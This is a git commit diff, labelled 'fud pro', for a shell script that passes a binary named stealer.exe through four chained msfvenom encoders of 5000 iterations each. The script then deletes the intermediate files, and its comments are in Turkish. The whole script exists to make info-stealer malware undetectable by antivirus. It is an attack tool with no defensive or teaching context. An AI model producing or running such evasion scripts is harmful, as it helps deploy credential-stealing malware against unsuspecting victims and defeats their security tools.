e396ada17cb4b599c31360b2bdfe2deb4b856666
Lunix <cyln.elif1@gmail.com>
2024-09-22 14:49:58 +0300

    fud pro

--- wsl.sh
+++ wsl.sh
@@ -1,2 +1,16 @@
 #!/bin/bash
-msfvenom -x stealer.exe -p generic/custom --arch x86 -e x86/jmp_call_additive -i 50 -f exe -o stealer.exe
+
+# İlk encode işlemi
+msfvenom -x stealer.exe -p generic/custom --arch x86 -e x86/jmp_call_additive -i 5000 -f exe -o temp_stealer.exe
+
+# İkinci encode işlemi
+msfvenom -x temp_stealer.exe -p generic/custom --arch x86 -e x86/shikata_ga_nai -i 5000 -f exe -o temp_stealer_v2.exe
+
+# Üçüncü encode işlemi
+msfvenom -x temp_stealer_v2.exe -p generic/custom --arch x86 -e x86/countdown -i 5000 -f exe -o temp_stealer_v3.exe
+
+# Dördüncü encode işlemi
+msfvenom -x temp_stealer_v3.exe -p generic/custom --arch x86 -e x86/fnstenv_mov -i 5000 -f exe -o stealer.exe
+
+# Temizlik 
+rm temp_stealer.exe temp_stealer_v2.exe temp_stealer_v3.exe
